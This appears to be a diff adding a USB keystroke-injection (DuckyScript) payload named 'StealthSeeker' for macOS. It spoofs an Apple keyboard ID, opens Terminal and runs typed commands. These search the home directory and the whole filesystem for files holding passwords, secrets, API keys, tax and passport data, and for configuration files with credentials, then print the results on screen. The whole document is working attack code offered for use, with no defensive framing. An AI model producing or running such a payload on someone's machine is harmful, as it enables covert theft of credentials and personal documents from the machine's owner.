@@ -1,0 +1,50 @@
+REM This script focuses on searching for common sensitive information 
+REM including passwords, secrets, API keys, and configuration files. 
+REM It performs a file search within specific file types and looks for specific patterns.
+REM The output will display any matches found in the search process.
+
+REM Author: Narsty
+REM Title: StealthSeeker
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: RECON
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING clear
+ENTER
+DELAY 500
+STRING echo "Initiating macOS sensitive information search..."
+ENTER
+DELAY 1000
+
+REM Search for Passwords and Secrets
+STRING echo "----- Passwords and Secrets -----"
+ENTER
+STRING grep -r -i -I --include='*.txt' --include='*.doc*' --include='*.xls*' --include='*.csv' --include='*.json' --exclude-dir='.git' --exclude-dir='node_modules' "password\|secret\|apikey\|taxes\|passport" ~ 2>/dev/null
+ENTER
+DELAY 1000
+
+REM Search for Configuration Files
+STRING echo "----- Configuration Files -----"
+ENTER
+STRING find / -type f \( -iname "*.conf" -o -iname "*.config" -o -iname "*.properties" -o -iname "*.ini" \) 2>/dev/null | xargs grep -E "username|password|apikey|secret" 2>/dev/null
+ENTER
+DELAY 1000
+
+REM Finished
+STRING echo "----- macOS sensitive information search completed! -----"
+ENTER
+
+
+
+
+
+
